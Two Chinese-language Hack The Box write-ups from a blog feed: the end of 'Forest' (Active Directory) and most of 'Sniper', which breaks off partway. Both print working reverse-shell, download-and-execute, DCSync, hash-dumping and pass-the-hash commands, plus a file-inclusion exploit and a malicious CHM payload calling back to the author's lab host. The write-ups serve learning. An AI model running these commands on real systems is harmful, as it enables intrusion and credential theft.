class="token string">"PS > "</span>        command <span class="token operator">=</span> gets                output <span class="token operator">=</span> shell<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>stdout<span class="token punctuation">,</span> stderr<span class="token operator">|</span>            <span class="token constant">STDOUT</span><span class="token punctuation">.</span>print stdout            <span class="token constant">STDERR</span><span class="token punctuation">.</span>print stderr        <span class="token keyword">end</span>    <span class="token keyword">end</span>        puts <span class="token string">"Exiting with code <span class="token interpolation"><span class="token delimiter tag">#&#123;</span>output<span class="token punctuation">.</span>exitcode<span class="token delimiter tag">&#125;</span></span>"</span><span class="token keyword">end</span></code></pre><p>执行交互，成功获取到<code>svc-alfresco</code>的shell：</p><p><img src="https://p3.ssl.qhimg.com/t0167b9a4c0dd0987c0.png"></p><p><strong>- 进入<code>svc-alfresco</code>用户的桌面，拿到<code>user flag</code>:</strong></p><p><img src="https://p4.ssl.qhimg.com/t01062c6915af4c6690.png"></p><p>为了操作方便后续操作，我决定建立反向shell。把<code>nc64.exe</code>放入<code>/var/html/www</code>目录，开启Apache 服务：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ sudo service apache2 start  </code></pre><p><img src="https://p5.ssl.qhimg.com/t01b3d6b2f9eecdd52d.png"></p><p>在winrm-shell中，下载执行，成功获取反向shell：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> > <span class="token function">iwr</span> <span class="token operator">-</span>uri http:<span class="token operator">/</span><span class="token operator">/</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67<span class="token operator">/</span>nc64<span class="token punctuation">.</span>exe <span class="token operator">-</span>outf shell<span class="token punctuation">.</span>exe<span class="token function">PS</span> > <span class="token punctuation">.</span><span class="token operator">/</span>shell<span class="token punctuation">.</span>exe 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67 8888 <span class="token operator">-</span>e powershell<span class="token punctuation">.</span>exe</code></pre><p><img src="https://p3.ssl.qhimg.com/t01983c216d5089e503.png"></p><p><img src="https://p4.ssl.qhimg.com/t013fbea0b507b7a77e.png"></p><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>这里使用到了<a href="https://github.com/BloodHoundAD/BloodHound/">Bloodhound</a>工具，如果有小伙伴对<code>active directly attack</code>不了解，可以参见它的github主页：<a href="https://github.com/BloodHoundAD/BloodHound/">https://github.com/BloodHoundAD/BloodHound/</a> 和知乎文章：<a href="https://zhuanlan.zhihu.com/p/121552304">《使用BloodHound查找Active Directory攻击路径》</a>。BloodHound是基于图的权限探索工具，它将列出给定域中对象之间的权限和关系，可以识别Active Directory（AD）中的不同攻击路径，其中包括访问控制列表（ACL）、用户、组、信任关系和唯一的AD对象等。</p><p>kali可以直接运行命令安装：<code>sudo apt-get install bloodhound</code>。</p></blockquote><p>首先将项目git到本地：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ git clone https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound.git</code></pre><p>这里要使用<code>/BloodHoundAD/BloodHound/blob/master/Ingestors/</code>目录下的<code>SharpHound.ps1</code>工具。将它放入<code>/var/html/www</code>中，在<code>svc-alfresco</code>的shell中加载执行：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">iex</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">"http://10.10.14.67/SharpHound.ps1"</span><span class="token punctuation">)</span><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">invoke-bloodhound</span> <span class="token operator">-</span>collectionmethod all <span class="token operator">-</span>domain htb<span class="token punctuation">.</span>local <span class="token operator">-</span>ldapuser svc<span class="token operator">-</span>alfresco <span class="token operator">-</span>ldappass s3rvice<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>Initializing SharpHound at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>Resolved Collection Methods: <span class="token function">Group</span><span class="token punctuation">,</span> Sessions<span class="token punctuation">,</span> LoggedOn<span class="token punctuation">,</span> Trusts<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> ObjectProps<span class="token punctuation">,</span> LocalGroups<span class="token punctuation">,</span> SPNTargets<span class="token punctuation">,</span> Container<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Creating Schema map <span class="token keyword">for</span> domain HTB<span class="token punctuation">.</span>LOCAL <span class="token keyword">using</span> path CN=Schema<span class="token punctuation">,</span>CN=Configuration<span class="token punctuation">,</span>DC=HTB<span class="token punctuation">,</span>DC=LOCAL<span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Cache File not Found: 0 Objects in cache<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Pre<span class="token operator">-</span>populating Domain Controller SIDSStatus: 0 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>0<span class="token punctuation">)</span> <span class="token operator">--</span> <span class="token keyword">Using</span> 84 MB RAMStatus: 123 objects finished <span class="token punctuation">(</span><span class="token operator">+</span>123 24<span class="token punctuation">.</span>6<span class="token punctuation">)</span><span class="token operator">/</span>s <span class="token operator">--</span> <span class="token keyword">Using</span> 118 MB RAMEnumeration finished in 00:00:05<span class="token punctuation">.</span>8247737Compressing <span class="token keyword">data</span> to C:\Users\svc<span class="token operator">-</span>alfresco\evil\20200402003811_BloodHound<span class="token punctuation">.</span>zipYou can upload this file directly to the UISharpHound Enumeration Completed at 12:38 AM on 4<span class="token operator">/</span>2<span class="token operator">/</span>2020<span class="token operator">!</span> Happy Graphing<span class="token operator">!</span></code></pre><p>执行结束后，可以看到当前目录生成了<code>20200402003811_BloodHound.zip </code>的分析结果：</p><p><img src="https://p1.ssl.qhimg.com/t01dc23f740f2e59396.png"></p><p>为了将分析结果取回，我在kali上开启了samba服务：</p><p>Sam.conf:</p><pre class="language-txt" data-language="txt"><code class="language-txt">...[global]workgroup &#x3D; WORKGROUPserver string &#x3D; Samba Server %vnetbios name &#x3D; kalisecurity &#x3D; usermap to guest &#x3D; bad username resolve order &#x3D; bcast hostdns proxy &#x3D; nobind interfaces only &#x3D; yes# add to the end[evil]   path &#x3D; &#x2F;home&#x2F;forest   writable &#x3D; yes   guest ok &#x3D; yes   guest only &#x3D; yes   read only &#x3D; no   create mode &#x3D; 0777   directory mode &#x3D; 0777   force user &#x3D; nobody</code></pre><p><img src="https://p4.ssl.qhimg.com/t0101e6e2a4319963a7.png"></p><blockquote><p>这里遇到一个小坑，如果靶机无法复制文件到共享目录（提示权限问题），可以直接将kali上这一共享的文件夹权限设为777，就可以成功传文件了。我猜测虽然在配置smb.conf时设置了<code>write</code>权限，配置了777，出现这个问题可能是配置与建立文件夹的先后顺序的问题。</p></blockquote><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\svc<span class="token operator">-</span>alfresco\evil> <span class="token function">copy</span> 20200402003811_BloodHound<span class="token punctuation">.</span>zip \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67\evil</code></pre><p>成功取回分析文件：</p><p><img src="https://p0.ssl.qhimg.com/t014128cf0bf6cef0ac.png"></p><p>在kali上启动BloodHound：</p><p><img src="https://p5.ssl.qhimg.com/t01507083738ba654c7.png"></p><p><img src="https://p3.ssl.qhimg.com/t01c0103d4cb9d0eb83.png"></p><p>导入分析文件<code>20200402003811_BloodHound.zip</code>，在搜索栏中搜索``svc-alfresco@htb.local<code>，添加</code>target：<a href="mailto:&#65;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#x74;&#x6f;&#x72;&#64;&#104;&#x74;&#x62;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;">&#65;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#x74;&#x6f;&#x72;&#64;&#104;&#x74;&#x62;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;</a>`，可以看到分析路径图：</p><p><img src="https://p5.ssl.qhimg.com/t014efdf9a589c83934.png"></p><p>从图中可以发现，用户<code>svc-alfresco</code>是<code>SERVICE ACCOUNT@HTB.LOCAL</code>组的成员，该组是另一个组<code>PRIVILEGED ACCOUNT@HTB.LOCAL</code>的成员，进而又是<code>ACCOUNT OPREATION@HTB.LOCAL</code>组的成员，进而又是<code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOACL</code>组的成员，最终连接到域<code>HTB.LOCAL</code>，并且还拥有<code>WriteDACL</code>权限。这一系列关键信息告诉我，可以为用户<code>svc-alfresco</code>授予<code>DCSync</code>特权，并展开<code>DCSync攻击</code>。</p><p>这里使用了<code>aclpwn.py</code>工具进行自动化的利用，对该工具不了解的小伙伴可以参见它的手册：<a href="https://github.com/fox-it/aclpwn.py/wiki/Quickstart">https://github.com/fox-it/aclpwn.py/wiki/Quickstart</a> ：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password &#39;s3rvice&#39;</code></pre><p><img src="https://p2.ssl.qhimg.com/t012b0f00897f4a809c.png"></p><p>接着<code>secretsdump.py</code>获取域中所有的用户hash，成功收获<code>Administrator</code>的hash值：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ .&#x2F;secretsdump.py -just-dc-ntlm &#39;svc-alfresco:s3rvice@10.10.10.161&#39;   </code></pre><p><img src="https://p2.ssl.qhimg.com/t0104fe28891db822c0.png"></p><p>利用Impacket工具中<code>wmiexec.py</code>脚本，使用该hash登录Administrator用户，成功获得超级权限：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ python .&#x2F;wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</code></pre><p><img src="https://p3.ssl.qhimg.com/t01b74cf7cf4d6a0dfd.png"></p><p>进入超级用户桌面，成功拿到<code>root flag</code>:</p><p><img src="https://p4.ssl.qhimg.com/t0117e15cb637b6e633.png"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>域渗透还需要进一步学习和提高，这次针对Forest靶机的渗透，弥补了很多知识空白，过程并不像文章整理的那样流畅，是一个自认为挺艰难的的过程。</p><p>最后，对Forest靶机的渗透测试过程进行一个简单的总结：</p><ul><li><p><strong>信息收集：</strong>查看端口、服务状态，获取到域内关键信息</p></li><li><p><strong>AS-REP Roast攻击 + hash 爆破：</strong>获取低级用户的密码，拿到user flag</p></li><li><p><strong>利用BloodHound展开域渗透分析</strong></p></li><li><p><strong>利用ACLPWN工具展开DCSync攻击：</strong>提权，获得超级用户的hash，拿到root flag</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack the box: Sniper</title>
    <link href="/2020/09/22/Hack-the-box-Sniper/"/>
    <url>/2020/09/22/Hack-the-box-Sniper/</url>
    
    <content type="html"><![CDATA[<p><img src="https://p3.ssl.qhimg.com/t014580c5bb32d4ece8.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>- 关于Hack the box：</strong><a href="https://www.hackthebox.eu/">Hack The Box</a>是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态<code>active</code>、<code>retired</code>。对于<code>retired</code>状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。</p><p><strong>- 关于Sniper lab：</strong>我在寻找测试靶机的过程中，发现Sniper在处于<code>retired</code>状态下依然可以访问，白嫖的感觉真香 =）。下图是对Sniper的简要介绍：</p><p><img src="https://p1.ssl.qhimg.com/t0144b24717475e936d.png"></p><p><img src="https://p0.ssl.qhimg.com/t012807f73730007771.png"></p><p><strong>- 渗透测试工具：</strong>kali、masscan、nmap、gobuster、samba、powershell、netcat</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>连接hack the box 个人账户VPN，分配ip：10.10.14.67。</p><p>使用<code>masscan</code>对靶机Sniper的ip：10.10.10.151 进行扫描，发现开放端口80、135、139、445、49667：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.151 --rate&#x3D;1000</code></pre><p><img src="https://p5.ssl.qhimg.com/t019cda3c6a4d431ddf.png"></p><p>使用<code>nmap</code>收集对应端口的服务信息：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~ nmap -n -v -Pn -p80,135,139,445,49667 -A --reason -oN nmap.txt 10.10.10.151</code></pre><p><img src="https://p5.ssl.qhimg.com/t01ff516230b63cfd5c.png"></p><p>经过分析决定从http服务入手进行渗透。访问10.10.10.151，查看到主页：</p><p><img src="https://p5.ssl.qhimg.com/t01265bcba4e3ac0566.png"></p><p>使用<code>gobuster</code>进行文件/目录枚举：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~ .&#x2F;gobuster dir -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-lowercase-2.3-small.txt -t 20 -x php,html -u http:&#x2F;&#x2F;10.10.10.151&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[+] Url:            http:&#x2F;&#x2F;10.10.10.151&#x2F;[+] Threads:        20[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-lowercase-2.3-small.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster&#x2F;3.0.1[+] Extensions:     html,php[+] Timeout:        10s&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2020&#x2F;03&#x2F;31 20:30:29 Starting gobuster&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x2F;Blog (Status: 301)&#x2F;Images (Status: 301)&#x2F;Index.php (Status: 200)&#x2F;blog (Status: 301)&#x2F;css (Status: 301)&#x2F;images (Status: 301)&#x2F;index.php (Status: 200)&#x2F;index.php (Status: 200)&#x2F;js (Status: 301)&#x2F;user (Status: 301)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2020&#x2F;03&#x2F;31 21:19:35 Finished&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</code></pre><p>通过枚举，发现/blog、/user等有用的信息：</p><p><img src="https://p0.ssl.qhimg.com/t01384d344c9d495d50.png"></p><p><img src="https://p1.ssl.qhimg.com/t01b53ae09d26b3fbee.png"></p><h2 id="0x03-文件包含漏洞"><a href="#0x03-文件包含漏洞" class="headerlink" title="0x03 文件包含漏洞"></a>0x03 文件包含漏洞</h2><p><strong>- 本地文件包含（Local File Inclusion）</strong></p><p>在检查blog页面时，发现<code>/blog?lang=***.php</code>，这种形式的GET请求，在参数处尝试文件包含漏洞是一个不错的选择：</p><p><img src="https://p0.ssl.qhimg.com/t014ab237e08c01167c.png"></p><p><img src="https://p1.ssl.qhimg.com/t01b32f21c83e2300ab.png"></p><p>尝试访问绝对路径下的<code>win.ini</code>信息：<code>http://10.10.10.151/blog?lang=/windows/win.ini</code>，成功读取到信息：</p><p><img src="https://p5.ssl.qhimg.com/t013fb5a5fe6b8ea582.png"></p><p><strong>- 远程文件包含漏洞（Remote File Inclusion）</strong></p><p>由本地文件包含漏洞的思路出发，尝试远程文件包含漏洞，这里的思路是使用Samba服务建立公共共享。</p><p>配置<code>smb.conf</code>：</p><pre class="language-txt" data-language="txt"><code class="language-txt">...[global]workgroup &#x3D; WORKGROUPserver string &#x3D; Samba Server %vnetbios name &#x3D; kalisecurity &#x3D; usermap to guest &#x3D; bad username resolve order &#x3D; bcast hostdns proxy &#x3D; nobind interfaces only &#x3D; yes# add to the end[evil]   path &#x3D; &#x2F;home&#x2F;sniper   writable &#x3D; yes   guest ok &#x3D; yes   guest only &#x3D; yes   read only &#x3D; no   create mode &#x3D; 0777   directory mode &#x3D; 0777   force user &#x3D; nobody</code></pre><p>构造<code>php.info</code>文件，并启动Samba服务，检测远程文件包含漏洞是否存在。经过检测，确实存在，成功读取到信息：</p><p><img src="https://p5.ssl.qhimg.com/t0152ca3cbd748d4cc5.png"></p><p><img src="https://p3.ssl.qhimg.com/t01746962ef968ff3e9.png"></p><h2 id="0x04-获取低级用户的shell"><a href="#0x04-获取低级用户的shell" class="headerlink" title="0x04 获取低级用户的shell"></a>0x04 获取低级用户的shell</h2><p>构造<code>cmd.php</code>、<code>evil.sh</code>，实现命令执行，并查看到当前用户名<code>iusr</code>：</p><p><img src="https://p4.ssl.qhimg.com/t014804465010e5f8b1.png"></p><pre class="language-shell" data-language="shell"><code class="language-shell">~ .&#x2F;evil.sh whoami    nt authority\iusr</code></pre><p>为了获得一个反向shell（reverse shell），需要使用<code>evil.sh</code>上传<code>netcat.exe</code>到靶机中。这里尝试了一些文件目录都没有成功，我猜测应该是<code>iusr</code>的权限问题。最终在<code>C:\windows\system32\spool\drivers\color\</code>目录中成功上传<code>2.exe</code>(netcat)：</p><pre class="language-none"><code class="language-none">~ .&#x2F;evil.sh &#39;powershell &#x2F;c iwr \\10.10.14.67&#x2F;evil&#x2F;nc64.exe -outf \windows\system32\spool\drivers\color\2.exe&#39;    ~.&#x2F;evil.sh &#39;dir \windows\system32\spool\drivers\color\&#39;                                                           Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\windows\system32\spool\drivers\color03&#x2F;31&#x2F;2020  03:21 PM    &lt;DIR&gt;          .03&#x2F;31&#x2F;2020  03:21 PM    &lt;DIR&gt;          ..03&#x2F;31&#x2F;2020  03:21 PM            43,696 2.exe09&#x2F;15&#x2F;2018  12:12 AM             1,058 D50.camp09&#x2F;15&#x2F;2018  12:12 AM             1,079 D65.camp09&#x2F;15&#x2F;2018  12:12 AM               797 Graphics.gmmp09&#x2F;15&#x2F;2018  12:12 AM               838 MediaSim.gmmp09&#x2F;15&#x2F;2018  12:12 AM               786 Photo.gmmp09&#x2F;15&#x2F;2018  12:12 AM               822 Proofing.gmmp09&#x2F;15&#x2F;2018  12:12 AM           218,103 RSWOP.icm09&#x2F;15&#x2F;2018  12:12 AM             3,144 sRGB Color Space Profile.icm09&#x2F;15&#x2F;2018  12:12 AM            17,155 wscRGB.cdmp09&#x2F;15&#x2F;2018  12:12 AM             1,578 wsRGB.cdmp              11 File(s)        289,056 bytes               2 Dir(s)  17,876,930,560 bytes free</code></pre><p>kali监听1234端口，并建立反向shell连接，成功获取<code>iusr</code>的shell：</p><pre class="language-none"><code class="language-none">~ .&#x2F;evil.sh &#39;start \windows\system32\spool\drivers\color\2.exe 10.10.14.67 1234 -e cmd.exe&#39;</code></pre><p><img src="https://p5.ssl.qhimg.com/t018dd1a71f5ecc2e04.png"></p><h2 id="0x05-提权——普通用户"><a href="#0x05-提权——普通用户" class="headerlink" title="0x05 提权——普通用户"></a>0x05 提权——普通用户</h2><p>利用<code>iusr</code>用户权限寻找有用的信息，发现靶机还有两个用户<code>Administrator</code>、<code>Chris</code>。在<code>C:\inetpub\wwwroot\user\db.php</code>中找到密码<code>36mEAhz/B8xQ~2VM</code>，我猜测这个应该就是<code>Chris</code>的密码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// Enter your Host, username, password, database below.</span><span class="token comment">// I left password empty because i do not set password on localhost.</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dbuser"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"36mEAhz/B8xQ~2VM"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"sniper"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check connection</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Failed to connect to MySQL: "</span> <span class="token punctuation">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>查看<code>Chris</code>的相关权限，发现他具有远程执行powershell的权限：</p><p><img src="https://p2.ssl.qhimg.com/t01692336bc9e0c316d.png"></p><p>进入powershell，配置<code>Chirs</code>认证信息：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">> <span class="token variable">$pw</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'36mEAhz/B8xQ~2VM'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force> <span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential<span class="token punctuation">(</span><span class="token string">"snipe\chris"</span><span class="token punctuation">,</span> <span class="token variable">$pw</span><span class="token punctuation">)</span>> <span class="token function">Enter-PSSession</span> <span class="token operator">-</span>ComputerName SNIPER <span class="token operator">-</span>Credential <span class="token variable">$cred</span></code></pre><p>kali监听4321段端口，成功获取<code>Chris</code>的反向shell：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">> <span class="token function">Start-Process</span> <span class="token operator">-</span>FilePath <span class="token string">"\windows\system32\spool\drivers\color\2.exe"</span> <span class="token operator">-</span>ArgumentList <span class="token string">"10.10.14.67 4321 -e cmd.exe"</span> <span class="token operator">-</span>NoNewWindow</code></pre><p><img src="https://p4.ssl.qhimg.com/t01eb7a4043722217ff.png"></p><p><strong>- 成功获得普通用户权限，拿到<code>user flag</code>:</strong></p><p><img src="https://p0.ssl.qhimg.com/t01197680466fc12bc6.png"></p><h2 id="0x06-提权——超级用户"><a href="#0x06-提权——超级用户" class="headerlink" title="0x06 提权——超级用户"></a>0x06 提权——超级用户</h2><p>在利用<code>Chris</code>权限寻找有用信息的过程中，在<code>C:\Docs\</code>、<code>C:\Users\Chris\Downloads\</code>目录下发现<code>note.txt</code>、<code>instructions.chm</code>两个有意思的文件：</p><p><img src="https://p1.ssl.qhimg.com/t01d4342a8a1364e108.png"></p><p><img src="https://p1.ssl.qhimg.com/t018036c5c6b19d0135.png"></p><p>从<code>note.txt</code>的留言信息中可以推测，老板对Chris的工作很不满意，需要将某个说明文档放到<code>C:\Docs\</code>目录中。而<code>.chm</code>文件就是通过html文件编译形成的“帮助文档”，所以我推测<code>instructions.chm</code>应该就是老板口中需要放在<code>C:\Docs\</code>目录中的文档。但当我将<code>C:\Users\Chris\Downloads\</code>目录下的<code>instructions.chm</code>复制到<code>C:\Docs\</code>中时，发现一个奇怪的现象，<code>instructions.chm</code>会在短时间内奇怪的消失。</p><p><img src="https://p1.ssl.qhimg.com/t01af1e4ef21c0f672f.png"></p><p>文档消失，或许是超级用户删除？让我感到这可能就是超级用户的漏洞点所在。为了利用这一疑点，首先需要构造一个恶意的<code>.chm</code>文件，包含需要执行的反向shell恶意代码，当超级用户对这个恶意文档有任何操作的时候，就能获取到超级用户的shell。</p><p>我在github上寻找如何构造恶意的<code>.chm</code>文件，在这里找到了可以借用的范本：<a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a> 。为了构造<code>.chm</code>恶意文件，还需要下载微软的<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138">HTML HELP Workshop</a>。</p><p>这里我在本地计算机中使用<code>powershell</code>，构造了一个名为<code>doc.chm</code>的恶意文件，<code>Payload &quot;C:\windows\system32\spool\drivers\color\2.exe -e powershell 10.10.14.67 8888&quot;</code>：</p><p><img src="https://p0.ssl.qhimg.com/t01d2b6096bb7125c05.png"></p><p><img src="https://p1.ssl.qhimg.com/t01dd14e4b379cdc223.png"></p><p>随后将<code>doc.chm</code>放入kali的samba共享目录中：</p><p><img 